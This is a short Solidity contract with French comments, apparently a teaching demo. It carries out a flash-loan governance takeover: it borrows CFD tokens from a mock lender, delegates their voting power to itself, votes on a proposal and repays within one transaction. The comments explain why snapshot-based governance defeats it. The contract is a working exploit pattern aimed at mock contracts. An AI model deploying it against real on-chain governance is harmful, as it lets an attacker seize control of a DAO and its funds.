// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IVotes} from "@openzeppelin/contracts/governance/utils/IVotes.sol";
import {MockFlashLender, IFlashBorrower} from "./MockFlashLender.sol";

/// @notice Seule fonction dont l'attaquant a besoin : NaiveGovernance et Governance l'exposent toutes les deux.
interface IVoting {
    function castVote(uint256 id, bool support) external;
}

/// @title FlashLoanAttacker - prise de contrôle éclair de la gouvernance (démo pédagogique)
/// @notice Dans UNE transaction : emprunte des CFD, se délègue les votes, vote, rend les CFD.
///         Contre une gouvernance sans snapshot, le vote compte. Contre Governance (snapshot au bloc
///         précédant la proposition), l'attaquant avait 0 CFD au snapshot : son vote est refusé.
contract FlashLoanAttacker is IFlashBorrower {
    MockFlashLender public immutable lender;
    IERC20 public immutable token;
    IVoting public immutable governance;
    address public immutable owner;

    constructor(MockFlashLender lender_, IVoting governance_) {
        lender = lender_;
        token = lender_.token();
        governance = governance_;
        owner = msg.sender;
    }

    function attack(uint256 proposalId, uint256 amount) external {
        require(msg.sender == owner, "pas owner");
        lender.flashLoan(amount, abi.encode(proposalId));
    }

    function onFlashLoan(uint256 amount, bytes calldata data) external {
        require(msg.sender == address(lender), "pas le preteur");
        uint256 proposalId = abi.decode(data, (uint256));
        IVotes(address(token)).delegate(address(this)); // active le pouvoir de vote des CFD empruntés
        governance.castVote(proposalId, true);
        require(token.transfer(address(lender), amount), "remboursement");
    }
}
